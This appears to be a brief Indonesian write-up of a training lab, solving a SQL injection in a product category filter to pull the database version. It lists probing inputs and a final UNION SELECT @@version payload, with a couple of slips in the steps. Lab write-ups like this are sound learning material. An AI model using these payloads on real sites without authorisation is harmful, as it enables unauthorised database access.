# Overview
web app vuln SQLI di bagian product category filter.

HINTS:
    - lihat cheatsheet SQLI dari portswigger

GOALS:
    - lakukan SQLI untuk retrieve string `8.0.35-0ubuntu0.20.04.1` 

# Analisis
cek apakah vuln terhadap SQLI dengan `'`

selanjutnya cek jumlah tabel `' order by 1--` menghasilkan error. Ganti dengan `#` untuk command
    - `' order by 1#`
    - `' order by 2#`

selanjutnya cek kolom yang dapat hold string
    - `' order by 'a',null#`
    - `' order by null,'a'#`

ternyata kedua kolom dapat dipakai untuk hold string, selanjutnya gunakan payload:
    - `'+union+select+%40%40version,'a'%23`
